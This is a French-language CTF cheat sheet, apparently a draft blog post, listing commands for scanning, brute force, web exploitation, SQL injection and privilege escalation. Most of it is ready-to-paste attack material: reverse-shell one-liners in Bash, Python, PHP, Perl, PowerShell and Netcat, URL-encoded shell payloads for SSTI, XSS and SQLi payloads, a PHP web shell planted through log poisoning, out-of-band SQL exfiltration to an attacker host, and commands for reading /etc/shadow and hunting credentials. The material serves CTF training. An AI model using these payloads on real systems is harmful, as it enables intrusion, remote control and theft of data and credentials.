+++
date = '2026-01-18T17:46:09-05:00'
draft = true
title = 'Aide-mémoire CTF — Commandes fréquentes'
author = 'Gabriel Bouchard'
categories = ['ctf']
tags = ['ctf', 'cheatsheet', 'commands', 'kali', 'tools']
+++

Ce document regroupe les **commandes, outils et techniques les plus courants rencontrés en CTF**.  
Il est conçu comme un **aide-mémoire pratique**, destiné à être consulté rapidement pendant une épreuve.

Les commandes sont :
- simples et reproductibles
- classées par **phase de challenge**
- accompagnées de **contextes d’utilisation** quand nécessaire

L’objectif n’est pas l’exhaustivité théorique, mais **l’efficacité en situation réelle**.

---

# Scan réseau et énumération


## Nmap — Scan réseau & services

`nmap` est l’outil de base pour identifier les ports ouverts, les services actifs et leurs versions.

### Commandes essentielles

- `nmap <ip>`  
  → Scan rapide des 1000 ports les plus courants

- `nmap -p- <ip>`  
  → Scan complet de tous les ports (1–65535)

- `nmap -sV <ip>`  
  → Détection des versions des services

- `nmap -sC -sV -oN scan.txt <ip>`  
  → Scripts par défaut + versions, sortie dans un fichier

- `nmap -A -T4 <ip>`  
  → Scan agressif (OS, traceroute, scripts)  
  ⚠️ Bruyant / intrusif

- `nmap -Pn <ip>`  
  → Ignore le ping (utile si ICMP bloqué)

### Bonnes pratiques
- Toujours commencer par `-p-`
- Affiner ensuite avec `-sC -sV`
- Ne pas abuser de `-A` en environnement réel

**Documentation :**  
https://nmap.org/book/man.html

---

## Gobuster — Découverte de chemins & sous-domaines

`gobuster` permet de brute-force des répertoires, fichiers et sous-domaines.

### Fuzz de répertoires

- `gobuster dir -u http://<url> -w /usr/share/wordlists/dirb/common.txt`  
  → Découverte de dossiers standards

- `gobuster dir -u http://<url> -w common.txt -x php,txt,bak`  
  → Recherche avec extensions spécifiques

- `gobuster dir -u http://<url> -w wordlist.txt -t 50`  
  → Fuzz rapide (50 threads)

### Fuzz de sous-domaines

- `gobuster dns -d <domain> -w subdomains.txt`  
  → Brute-force DNS

### Conseils
- Utiliser **SecLists**
- Attention aux faux positifs (`--wildcard`)
- Vérifier les codes HTTP retournés

**Documentation :**  
https://github.com/OJ/gobuster

---

## ffuf — Fuzzing rapide et flexible

`ffuf` est souvent préféré à Gobuster pour sa **vitesse** et sa **flexibilité**.

### Fuzz de répertoires

- `ffuf -u http://<ip>/FUZZ -w /usr/share/wordlists/dirb/common.txt`

### Fuzz avec extensions

- `ffuf -u http://<ip>/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.bak`

### Fuzz de paramètres GET

- `ffuf -u http://<ip>/page.php?file=FUZZ -w payloads.txt`

### Fuzz POST

- `ffuf -u http://<ip>/login -X POST -d "user=FUZZ&pass=test" -w usernames.txt`

### Fuzz multi-variables

- `ffuf -u http://<ip>/FUZZ/BUZZ -w w1.txt:FUZZ -w w2.txt:BUZZ`

### Options utiles
- `-fc 403` → ignore codes 403
- `-mc 200` → ne garde que 200
- `-t 50`   → threads
- `-o`      → export résultats

**Documentation :**  
https://github.com/ffuf/ffuf

---

## Nikto — Scan de vulnérabilités web

Nikto détecte des **fichiers sensibles**, **configurations faibles** et **logiciels obsolètes**.

⚠️ Très bruyant ⚠️

### Commandes courantes

- `nikto -h http://<ip>`
- `nikto -h http://<ip>:<port>`
- `nikto -h http://<ip>/chemin/`
- `nikto -h https://<ip> -p 443`
- `nikto -host <ip> -output nikto.txt`

### Scan avec authentification

- `nikto -h http://<ip>:<port>/manager/html -id admin:admin`

### Options utiles

- `-Display V` → uniquement vulnérabilités
- `-Tuning x`  → scan ciblé
- `-Plugins`   → plugins spécifiques
- `-Format`    → html / csv / xml

### Bonnes pratiques
- Utiliser après un `nmap`
- Complémentaire à `gobuster` et `ffuf`

---

# Brute force & Credentials


## Hydra — Brute force de services

Hydra permet de brute-force de nombreux services réseau (SSH, FTP, HTTP, RDP, etc.).

### SSH

- `hydra -l utilisateur -P /usr/share/wordlists/rockyou.txt ssh://IP`
- `hydra -L users.txt -P passwords.txt ssh://IP`
- `hydra -l root -P rockyou.txt ssh://IP -t 4`

### FTP

- `hydra -l utilisateur -P rockyou.txt ftp://IP`
- `hydra -L users.txt -P passwords.txt ftp://IP`

### HTTP Basic Auth

- `hydra -l admin -P rockyou.txt IP http-get /admin`
- `hydra -L users.txt -P passwords.txt IP http-get /secure`

### HTTP POST (formulaire)

- `hydra -l admin -P rockyou.txt IP http-post-form "/login.php:user=^USER^&pass=^PASS^:F=Invalid"`
- `hydra -L users.txt -P passwords.txt IP http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"`

### Options utiles

- `-l` → utilisateur unique  
- `-L` → fichier d’utilisateurs  
- `-p` → mot de passe unique  
- `-P` → wordlist  
- `-t` → nombre de threads  
- `-f` → stop à la première réussite  

---

## Wordlists utiles

### Kali Linux — chemins standards

- `/usr/share/wordlists/rockyou.txt`
- `/usr/share/seclists/Passwords/Common-Credentials/top-100.txt`
- `/usr/share/seclists/Passwords/Common-Credentials/top-1000.txt`
- `/usr/share/seclists/Usernames/top-usernames-shortlist.txt`
- `/usr/share/seclists/Discovery/Web-Content/common.txt`

Décompression de rockyou :

- `gunzip /usr/share/wordlists/rockyou.txt.gz`

---

## Hashcat — cassage de hash

Hashcat permet de casser des hashs via CPU ou GPU.

### Commandes classiques

- `hashcat -m 0 -a 0 hash.txt rockyou.txt`
- `hashcat -m 100 -a 0 hash.txt rockyou.txt`
- `hashcat -m 1800 -a 0 hash.txt rockyou.txt --force`
- `hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a`

### Détection GPU

- `hashcat -I`

### Options importantes

- `-m` → type de hash  
- `-a` → mode d’attaque  
- `--force` → forcer l’exécution  
- `--show` → afficher les hashs crackés  

## Réseau & Shells


## Netcat (nc)

`netcat` est un outil polyvalent pour interagir avec des services réseau, écouter des ports et transférer des fichiers.

### Connexion à un service

- `nc IP PORT`

### Listener (écoute)

- `nc -lvnp PORT`

Options courantes :
- `-l` : listen
- `-v` : verbose
- `-n` : no DNS
- `-p` : port

### Scan rapide de ports

- `nc -zv IP 1-1000`

---

## Reverse shells

Toujours commencer par lancer un listener côté attaquant :
- `nc -lvnp PORT`

### Bash (classique)

- `bash -i >& /dev/tcp/IP/PORT 0>&1`
- `bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'`

### Bash (URL-encoded / injection)

Utile lorsque les caractères spéciaux sont filtrés (XSS, SSTI, injections web) :

- `bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/YOUR_PORT+0>%261'`

---

### Netcat (si l’option -e est autorisée)

- `nc IP PORT -e /bin/bash`

---

### Python

- `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'`

---

### PHP

- `php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'`

---

### Perl

- `perl -e 'use Socket;$i=\"IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'`

---

### PowerShell (Windows)

- `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"IP\",PORT);$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+\"PS \"+(pwd).Path+\"> \";$o=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($o,0,$o.Length)};`

---

## Transferts de fichiers

### Avec netcat

Machine receveuse :
- `nc -lvnp PORT > fichier`

Machine envoyant :
- `nc IP PORT < fichier`

---

### Via HTTP (Python)

Attaquant :
- `python3 -m http.server 8000`

Cible :
- `wget http://IP:8000/fichier`
- `curl http://IP:8000/fichier -o fichier`

---

### Via SCP

- `scp fichier user@IP:/chemin/`
- `scp user@IP:/chemin/fichier .`

---

## Stabilisation de shell

Après obtention d’un shell :

- `python3 -c 'import pty;pty.spawn("/bin/bash")'`
- `export TERM=xterm`
- `CTRL+Z`
- `stty raw -echo; fg`

---

## Bonnes pratiques

- Tester plusieurs reverse shells si nécessaire
- Stabiliser le shell rapidement
- Noter IP / port utilisés
- Vérifier les permissions après connexion

---
# Web Exploitation 

## Fuzzing Web

### Fuzzing de paramètres GET

- `ffuf -u "http://IP/page.php?param=FUZZ" -w payloads.txt`

---

### Fuzzing POST

- `ffuf -u http://IP/login -X POST -d "user=FUZZ&pass=test" -w usernames.txt`

---

### Fuzzing d’extensions

- `ffuf -u http://IP/FUZZ -w common.txt -e .php,.txt,.bak,.old`

---

### Fuzzing d’API

- `ffuf -u http://IP/api/FUZZ -w api-endpoints.txt -mc 200`

---

## XSS — Cross-Site Scripting

### Payloads de base

- `<script>alert(1)</script>`
- `"><script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`
- `<svg/onload=alert(1)>`

---

### Bypass de filtres

- `<ScRiPt>alert(1)</ScRiPt>`
- `<script>alert(String.fromCharCode(88,83,83))</script>`
- `&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;`

---

### XSS via attribut HTML

- `" autofocus onfocus=alert(1) x="`
- `" onmouseover="alert(1)`

---

### XSS dans un contexte JavaScript

- `';alert(1);//`
- `"+alert(1)+"`

---

## SSTI — Server-Side Template Injection

### Détection

- `{{7*7}}`
- `${7*7}`
- `<%= 7*7 %>`

Si la page retourne **49**, SSTI probable.

---

### Payloads Jinja2 (Flask)

- `{{config}}`
- `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}`

---

### Reverse shell via SSTI (URL-encoded)

Payload prêt à injecter :
- `bash+-c+'bash+-i+>%26+/dev/tcp/YOUR_IP/YOUR_PORT+0>%261'`

Listener côté attaquant :
- `nc -lvnp YOUR_PORT`

---

## LFI — Local File Inclusion

### Tests classiques

- `?file=../../../../etc/passwd`
- `?page=../../../../etc/passwd`
- `?path=../../../../etc/passwd`

---

### Bypass simples

- `?file=....//....//etc/passwd`
- `?file=../../../../etc/passwd%00`
- `?file=php://filter/convert.base64-encode/resource=index.php`

---

### Lecture de code source PHP

- `php://filter/convert.base64-encode/resource=config.php`

Décoder ensuite avec :
- `base64 -d`

---

## LFI → RCE (log poisoning)

### Apache

- `curl http://IP -A "<?php system($_GET['cmd']); ?>"`
- `?file=/var/log/apache2/access.log&cmd=id`

---

## Bonnes pratiques Web CTF

- Toujours tester **GET, POST, headers, cookies**
- Vérifier le contexte (HTML / JS / template)
- URL-encoder les payloads si nécessaire
- Tester plusieurs bypass simples avant d’abandonner
- Garder **CyberChef** et **Burp** ouverts

---

## Références utiles

- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://book.hacktricks.xyz/pentesting-web
- https://portswigger.net/web-security
- https://www.revshells.com/

---
# SQL Injection


## Types de SQL Injection

### In-Band SQLi

**Error-Based**

- `?id=1 AND 1=CONVERT(int,(SELECT @@version))`  
  → Force une erreur SQL pour afficher des informations

**Union-Based**

- `?id=1 UNION SELECT NULL, version(), database()`  
  → Extraction directe via UNION

- `?id=1 ORDER BY 3 --`  
  → Déterminer le nombre de colonnes

---

### Blind SQLi

**Boolean-Based**

- `?id=1 AND 1=1 --`  
  → Condition vraie

- `?id=1 AND 1=2 --`  
  → Condition fausse

**Time-Based (MySQL)**

- `?id=1 AND IF(1=1, SLEEP(5), 0)`  
  → Délai si la condition est vraie

**Time-Based (MSSQL)**

- `IF (1=1) WAITFOR DELAY '00:00:05'`  
  → Délai côté serveur MSSQL

---

### Second-Order SQLi

- `Tim'; DROP TABLE users; --`  
  → Payload stocké puis exécuté plus tard

---

## Payloads SQLi courants

### Bypass d’authentification

- `' OR 1=1 --`  
  → Bypass classique

- `' OR '1'='1`  
  → Variante sans commentaire

---

### Extraction simple

- `UNION SELECT username, password FROM users`  
  → Dump basique d’une table

---

## Out-of-Band (OOB) SQL Injection

### MySQL via SMB

- `1'; SELECT user() INTO OUTFILE '\\\\KALI_IP\\logs\\user.txt'; --`  
  → Exfiltration via partage SMB

---

### MSSQL via xp_cmdshell

- `EXEC xp_cmdshell 'whoami'`  
  → Exécution de commande système

---

### Oracle via HTTP

- `BEGIN UTL_HTTP.request('http://KALI_IP/exfil'); END;`  
  → Exfiltration via requête HTTP

---

## Bypass & Évasion

### Sans guillemets

- `?id=1 OR 1=1`  
  → Injection sans quotes

---

### Espaces filtrés

- `?id=1/**/OR/**/1=1`  
  → Bypass de filtres d’espaces

---

### URL Encoding

- `%27%20OR%201=1--`  
  → Bypass via encodage URL

---

## Outils SQL Injection

### SQLMap

- `sqlmap -u "http://site.com/page.php?id=1" --batch`  
  → Détection automatique

- `sqlmap -u URL --dbs`  
  → Lister les bases

- `sqlmap -u URL -D db -T table --dump`  
  → Dump des données

---

### sqlninja (MSSQL)

- `sqlninja -u "http://site.com/page.php?id=1"`  
  → Exploitation MSSQL

---

### jSQL Injection (GUI)

- `jsql`  
  → Lancer l’interface graphique

---

## Bonnes pratiques SQLi CTF

- Tester **GET, POST, headers, cookies**
- Identifier le SGBD (MySQL / MSSQL / Oracle)
- Commencer simple (`' OR 1=1`)
- Passer à **Blind / OOB** si aucun retour

# Privilege Escalation

L’approche recommandée est :
1. Énumération
2. Identification d’une mauvaise configuration
3. Exploitation ciblée

---

## Linux — Privilege Escalation


### Informations système

- `id`  
  → Affiche l’utilisateur courant et ses groupes

- `whoami`  
  → Utilisateur courant

- `uname -a`  
  → Infos noyau (utile pour exploits kernel)

- `cat /etc/os-release`  
  → Distribution Linux

---

### Sudo

Lister les commandes autorisées :
- `sudo -l`  
  → Vérifie les binaires exécutables en sudo

Si un binaire est listé :
- Vérifier sur **GTFOBins**
- Tester l’exécution avec `sudo <commande>`

---

### Fichiers SUID

Lister les binaires SUID :
- `find / -perm -4000 -type f 2>/dev/null`

Exemples courants exploitables :
- `find`
- `vim`
- `nmap`
- `perl`
- `python`
- `bash`

→ Vérifier systématiquement sur **https://gtfobins.github.io/**

---

### Capabilities Linux

Lister les capabilities :
- `getcap -r / 2>/dev/null`

Exemple exploitable :
- `/usr/bin/python3 = cap_setuid+ep`

→ Permet souvent un `setuid(0)`

---

### Cron jobs

Lister les tâches cron :
- `crontab -l`
- `ls -la /etc/cron*`
- `cat /etc/crontab`

À vérifier :
- Scripts modifiables
- Scripts exécutés en root
- Chemins relatifs

---

### Fichiers modifiables

Rechercher fichiers root modifiables :
- `find / -writable -type f 2>/dev/null | grep root`
- `find / -perm -2 -type f 2>/dev/null`

---

### Variables d’environnement

- `env`
- `printenv`

À surveiller :
- `PATH`
- `LD_PRELOAD`
- `LD_LIBRARY_PATH`

---

### Password reuse

- `cat /etc/passwd`
- `cat /etc/shadow` (si lisible)
- `grep -R \"password\" / 2>/dev/null`

Tester les mots de passe trouvés avec :
- `su`
- `sudo`
- `ssh`

---

## Windows — Privilege Escalation


### Informations système

- `whoami`
- `whoami /groups`
- `whoami /priv`
- `systeminfo`

→ Identifier privilèges intéressants :
- `SeImpersonatePrivilege`
- `SeBackupPrivilege`
- `SeRestorePrivilege`
- `SeTakeOwnershipPrivilege`

---

### Services vulnérables

Lister les services :
- `sc query`
- `wmic service get name,displayname,pathname,startmode`

À vérifier :
- Chemins avec espaces non quotés
- Binaires modifiables
- Services exécutés en SYSTEM

---

### Scheduled Tasks

- `schtasks /query /fo LIST /v`

Chercher :
- Scripts modifiables
- Tâches exécutées en SYSTEM

---

### Permissions fichiers

- `icacls \"C:\\Program Files\"`
- `icacls \"C:\\Program Files (x86)\"`

Rechercher :
- `BUILTIN\\Users:(F)`
- `Everyone:(F)`

---

### Registre

- `reg query HKLM /f password /t REG_SZ /s`
- `reg query HKCU /f password /t REG_SZ /s`

---

### Tokens & Impersonation

Si `SeImpersonatePrivilege` est présent :
- Tester **PrintSpoofer**
- Tester **JuicyPotato / RoguePotato**

---

## Scripts d’énumération

### LinPEAS (Linux)

- `wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh`
- `chmod +x linpeas.sh`
- `./linpeas.sh`

---

### WinPEAS (Windows)

- Télécharger `winPEASx64.exe`
- Lancer depuis un terminal :
  - `winPEASx64.exe`

---

### LinEnum

- `git clone https://github.com/rebootuser/LinEnum.git`
- `cd LinEnum`
- `chmod +x LinEnum.sh`
- `./LinEnum.sh`

---

### pSpy (Linux)

- `wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64`
- `chmod +x pspy64`
- `./pspy64`

→ Idéal pour détecter des **cron jobs** ou scripts exécutés périodiquement

---

## Bonnes pratiques Privilege Escalation

- Toujours **énumérer avant d’exploiter**
- Lire la sortie des scripts attentivement
- Vérifier **GTFOBins** systématiquement
- Tester plusieurs vecteurs (sudo, SUID, cron, services)
- Ne jamais se focaliser sur un seul chemin

---

**Références utiles :**
- https://gtfobins.github.io/
- https://book.hacktricks.xyz/linux-hardening/privilege-escalation
- https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- https://github.com/carlospolop/PEASS-ng

# Recherche de fichiers & OS 

## Recherche de fichiers (Linux)

### Recherche par nom de fichier

- `find / -type f -name "flag.txt" 2>/dev/null`  
  → Recherche exacte d’un fichier

- `find / -type f -iname "*flag*" 2>/dev/null`  
  → Recherche insensible à la casse

- `find / -type f -iname "*.php" 2>/dev/null`  
  → Tous les fichiers PHP

---

### Recherche de fichiers sensibles

- `find / -type f \\( -name "*.bak" -o -name "*.old" -o -name "*.zip" \\) 2>/dev/null`  
  → Fichiers de backup

- `find / -type f -iname "*config*" 2>/dev/null`  
- `find / -type f -iname "*secret*" 2>/dev/null`  
- `find / -type f -iname "*passwd*" 2>/dev/null`  

---

### Recherche par permissions

- `find / -perm -4000 -type f 2>/dev/null`  
  → Fichiers SUID

- `find / -perm -2000 -type f 2>/dev/null`  
  → Fichiers SGID

- `find / -writable -type d 2>/dev/null`  
  → Dossiers modifiables

---

## Recherche par contenu

### grep — Recherche de mots-clés

- `grep -R "password" /var/www 2>/dev/null`  
  → Recherche de mots de passe dans le code web

- `grep -R "flag" / 2>/dev/null`  
  → Recherche globale (bruyant)

- `grep -Ri "token" .`  
  → Recherche récursive dans le dossier courant

---

### Recherche de credentials

- `grep -R \"DB_PASSWORD\" / 2>/dev/null`
- `grep -R \"SECRET_KEY\" / 2>/dev/null`
- `grep -R \"API_KEY\" / 2>/dev/null`

---

## Énumération du système (Linux)

### Informations générales

- `uname -a`  
  → Kernel & architecture

- `cat /etc/os-release`  
  → Distribution Linux

- `hostname`  
  → Nom de la machine

- `id`  
  → UID / GID / groupes

---

### Utilisateurs & groupes

- `cat /etc/passwd`  
- `cat /etc/group`  

- `whoami`  
- `who`  

---

### Processus & services

- `ps aux`  
  → Liste des processus

- `ps aux | grep root`  
  → Processus root

- `systemctl list-units --type=service`  
  → Services actifs

---

### Réseau

- `ip a`  
- `ip route`  
- `ss -tulnp`  
- `netstat -tulnp`  

---

## Énumération Windows

### Informations système

- `systeminfo`  
- `whoami`  
- `whoami /priv`  
- `hostname`  

---

### Utilisateurs

- `net user`  
- `net localgroup administrators`  

---

### Réseau

- `ipconfig /all`  
- `netstat -ano`  

---

## OSINT local & fichiers intéressants

### Historique des commandes

- `cat ~/.bash_history`
- `cat ~/.zsh_history`

---

### Fichiers récemment modifiés

- `find / -type f -mtime -1 2>/dev/null`  
  → Modifiés il y a moins de 24h

---

### Variables d’environnement

- `env`
- `printenv`

---

## Bonnes pratiques

- Toujours commencer par `uname -a` et `/etc/os-release`
- Rechercher les fichiers SUID avant toute exploitation
- Inspecter le code web (`/var/www`)
- Lire les historiques utilisateurs
- Combiner avec **LinPEAS / WinPEAS** pour accélérer

# Outils & Dépôts GitHub


## Dépôts GitHub utiles (automatisation, shells, payloads, privesc)

Ces outils sont utilisés pour gagner du temps, automatiser la reconnaissance, générer des reverse shells, détecter des failles ou faire de l'élévation de privilèges.

- [Pentestmonkey](https://github.com/pentestmonkey) – Scripts classiques : reverse shells, FTP brute force, HTTP POST brute, etc.
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) – Repository massif de payloads pour tous types de failles.
- [Gixy](https://github.com/yandex/gixy) – Analyseur de fichiers de configuration Nginx pour détecter des erreurs de sécurité.
- [Reverse-Shell-Generator](https://github.com/0dayCTF/reverse-shell-generator) – Générateur de reverse shells (Bash, Python, PHP, etc.).
- [GTFOBins](https://github.com/GTFOBins/GTFOBins.github.io) – Exploits d’utilitaires Linux pour obtenir des shells.
- [AutoRecon](https://github.com/Tib3rius/AutoRecon) – Scanner de reconnaissance automatique (nmap, gobuster, nikto, etc.).
- [LinPEAS / WinPEAS (PEASS-ng)](https://github.com/carlospolop/PEASS-ng) – Enumeration complète Linux/Windows pour privesc.
- [LinEnum](https://github.com/rebootuser/LinEnum) – Énumération locale Linux pour privilege escalation.
- [PrivescCheck](https://github.com/itm4n/PrivescCheck) – Vérification automatisée des vulnérabilités de privesc sur Windows.
- [nishang](https://github.com/samratashok/nishang) – Framework PowerShell (shells, enum, post-exploitation).
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) – Collection de scripts PowerShell pour la post-exploitation Windows.
- [FuzzySecurity](https://github.com/FuzzySecurity) – Scripts Windows (UAC bypass, privesc, DLL injection, etc.).
- [SecLists](https://github.com/danielmiessler/SecLists) – Collection de wordlists (bruteforce, discovery, fuzzing, etc.).
- [pSpy](https://github.com/DominicBreuker/pspy) – Surveille les processus (crons/tâches) sans droits root.
- [Linux Smart Enumeration (lse)](https://github.com/diego-treitos/linux-smart-enumeration) – Script Bash léger pour enum Linux.
- [bypass-firewalls-by-DNS-history](https://github.com/vincentcox/bypass-firewalls-by-DNS-history) – OSINT : retrouver IP historiques via DNS.

- [Hack Stuff (0xdf)](https://0xdf.gitlab.io/) – Writeups HackTheBox (excellent pour apprendre).
- [Espanso](https://espanso.org/) – Macro / snippets (pratique pour copier-coller des payloads vite).

---

Tu peux en retrouver d'autres via : https://github.com/enaqx/awesome-pentest

---

## Outils GitHub fréquemment utilisés (explication)

Ces outils sont pratiques pour les CTF et les pentests. Ils servent à : générer des reverse shells, faire de l’énumération automatique, détecter des failles, ou obtenir un accès root.

Chaque outil ci-dessous précise :
- À quoi il sert
- Sur quelle machine l’utiliser (cible ou attaquant)
- Comment l’installer
- Exemple d’utilisation

---

### Pentestmonkey

**But :** Fournit des reverse shells prêts à l’emploi, des scripts de bruteforce et des formulaires HTTP POST de test.  
**Machine :** À utiliser depuis la machine de l’attaquant.  
**Lien :** https://github.com/pentestmonkey

**Utilisation :**
- Copier les reverse shells et coller dans un script ou un champ d’injection (comme `cmd`, `eval`, etc.)

---

### PayloadsAllTheThings

**But :** Liste massive de payloads (XSS, SQLi, SSTI, etc.) et de méthodologies.  
**Machine :** Attaquant (référence ou copier-coller dans Burp, navigateur, etc.)  
**Installation :**
- `git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git`

**Utilisation :**
- Lire les `.md` dans le dossier correspondant à la faille que vous testez.

---

### Gixy

**But :** Vérifie les fichiers de configuration Nginx pour trouver des failles (open redirect, SSRF...)  
**Machine :** Attaquant (analyser la conf extraite)  
**Installation :**
```bash
pip install gixy
```

**Utilisation :**
```bash
gixy nginx.conf
```

---

### Reverse-Shell-Generator

**But :** Génère des commandes pour ouvrir un reverse shell vers ta machine.  
**Machine :** À exécuter sur la machine cible (après injection ou exécution de commande).  
**Installation :**
```bash
git clone https://github.com/0dayCTF/reverse-shell-generator.git
cd reverse-shell-generator
python3 reverse-shell-generator.py
```

---

### GTFOBins

**But :** Montre comment détourner des commandes Unix/Linux (ex : `awk`, `less`, `vi`) pour exécuter du code arbitraire.  
**Machine :** Cible Linux où ces commandes sont disponibles  
**Utilisation :**
- Aller sur https://gtfobins.github.io/
- Chercher une commande autorisée avec sudo ou SUID
- Suivre la méthode affichée (shell, file-read, etc.)

---

### AutoRecon

**But :** Scanner automatique qui lance `nmap`, `gobuster`, `nikto`, etc. pour détecter des services, failles, répertoires.  
**Machine :** Attaquant  
**Installation :**
```bash
pip3 install git+https://github.com/Tib3rius/AutoRecon.git
```

**Utilisation :**
```bash
autorecon <ip-cible>
```

---

### LinPEAS (PEASS-ng)

**But :** Script d’énumération Linux complet pour trouver des failles de privesc (fichiers sensibles, sudo, crons, capabilities, etc.).  
**Machine :** À uploader/exécuter sur la cible Linux  
**Utilisation :**
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

---

### WinPEAS (PEASS-ng)

**But :** Même idée que LinPEAS, mais pour Windows.  
**Machine :** Cible Windows (upload via RDP/SMB/reverse shell...)  
**Utilisation :**
- Télécharger `winPEASx64.exe` depuis les releases GitHub
- Exécuter depuis un terminal Windows

---

### LinEnum

**But :** Script Bash qui fait une énumération complète de la machine Linux pour trouver des failles.  
**Machine :** Cible Linux  
**Installation :**
```bash
git clone https://github.com/rebootuser/LinEnum.git
cd LinEnum
chmod +x LinEnum.sh
./LinEnum.sh
```

---

### PrivescCheck

**But :** Énumération automatisée des failles de privesc sur Windows.  
**Machine :** Cible Windows  
**Utilisation :**
```powershell
powershell -ExecutionPolicy Bypass -File .\PrivescCheck.ps1
```

---

### nishang

**But :** Scripts PowerShell pour exploitation (shell, downloads, enum, etc.)  
**Machine :** À utiliser depuis la machine cible Windows  
**Installation :**
```bash
git clone https://github.com/samratashok/nishang.git
cd nishang/Shells
```

---

### PowerSploit

**But :** Framework post-exploitation Windows (dump creds, recon, etc.)  
**Machine :** Cible Windows  
**Installation :**
```bash
git clone https://github.com/PowerShellMafia/PowerSploit.git
```

---

### FuzzySecurity

**But :** Scripts d’exploitation Windows (UAC bypass, privesc, DLL injection, etc.)  
**Machine :** Cible Windows  
**Utilisation :**
- Lire les README dans chaque dossier

---

### SecLists

**But :** Wordlists pour bruteforce, discovery, fuzzing.  
**Machine :** Attaquant (gobuster, hydra, ffuf, etc.)  
**Installation :**
```bash
sudo apt install seclists
```

**Path :**
- `/usr/share/seclists/`

---

### pSpy

**But :** Surveille tous les processus exécutés en arrière-plan (utile pour crons, scripts SUID...)  
**Machine :** Cible Linux (pas besoin de root)  
**Utilisation :**
```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64
```

---

### Linux Smart Enumeration (lse.sh)

**But :** Alternative légère à LinPEAS pour faire une énumération système rapide.  
**Machine :** Cible Linux  
**Utilisation :**
```bash
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
chmod +x lse.sh
./lse.sh -l 1
```

---

### DNS History Firewall Bypass

**But :** Contourne des restrictions en retrouvant les IP historiques d’un domaine via son historique DNS.  
**Machine :** Attaquant  
**Installation :**
```bash
git clone https://github.com/vincentcox/bypass-firewalls-by-DNS-history.git
cd bypass-firewalls-by-DNS-history
python3 bypass-firewalls-by-DNS-history.py -d <target.com>
```

# Sites utiles — Référence CTF


## Analyse & Décodage

- **CyberChef**  
  https://gchq.github.io/CyberChef/  
  → Outil tout-en-un pour encodage/décodage (Base64, XOR, AES, RSA, gzip, etc.)

- **dCode**  
  https://www.dcode.fr/  
  → Décodage de chiffrements classiques, maths, crypto, stéganographie légère

- **Boxentriq**  
  https://www.boxentriq.com/code-breaking  
  → Analyse de chiffres classiques, fréquences, crypto historique

- **Base64 Decode**  
  https://www.base64decode.org/  
  → Encode / décode Base64 rapidement

- **XOR Calculator**  
  https://xor.pw/#  
  → Calcul et tests XOR (crypto, reversing)

- **Brainfuck Interpreter**  
  https://copy.sh/brainfuck/  
  → Interpréteur Brainfuck en ligne

---

## Web Exploitation

- **PortSwigger Web Security Academy**  
  https://portswigger.net/web-security  
  → Référence officielle pour XSS, SQLi, CSRF, SSRF, etc.

- **HackTricks**  
  https://book.hacktricks.xyz/  
  → Méthodologies d’exploitation complètes (web, réseau, privesc)

- **PayloadsAllTheThings (Web)**  
  https://github.com/swisskyrepo/PayloadsAllTheThings  
  → Payloads XSS, SQLi, SSTI, LFI, RCE

- **JWT.io**  
  https://jwt.io/  
  → Décodage et analyse de JSON Web Tokens

- **JS Beautifier**  
  https://beautifier.io/  
  → Dé-obfuscation et formatage de JavaScript

- **Regex101**  
  https://regex101.com/  
  → Tester, comprendre et debugger des regex

---

## Reverse Engineering & Exploitation

- **Exploit-DB**  
  https://www.exploit-db.com/  
  → Base de données d’exploits publics

- **GTFOBins**  
  https://gtfobins.github.io/  
  → Détournement de binaires Linux pour shell / privesc

- **RevShells**  
  https://www.revshells.com/  
  → Génération de reverse shells (bash, python, php, powershell)

---

## OSINT & Recherche

- **Shodan**  
  https://www.shodan.io/  
  → Recherche de services exposés sur Internet

- **Censys**  
  https://search.censys.io/  
  → Scan Internet, certificats TLS, hôtes

- **Wayback Machine**  
  https://web.archive.org/  
  → Historique de sites web (fichiers supprimés, endpoints anciens)

---

## Hash & Mots de passe

- **CrackStation**  
  https://crackstation.net/  
  → Lookup de hash via base de données

- **Hash Analyzer**  
  https://www.tunnelsup.com/hash-analyzer/  
  → Identification automatique du type de hash

---

## Apprentissage & Références CTF

- **CTF101**  
  https://ctf101.org/  
  → Introduction claire par catégorie de challenge

- **0xdf Writeups**  
  https://0xdf.gitlab.io/  
  → Writeups Hack The Box détaillés

- **Awesome Pentest**  
  https://github.com/enaqx/awesome-pentest  
  → Liste massive d’outils et ressources pentest

# Notes rapides


## Shells rapides (one-liners)

### Bash reverse shell
`bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1`

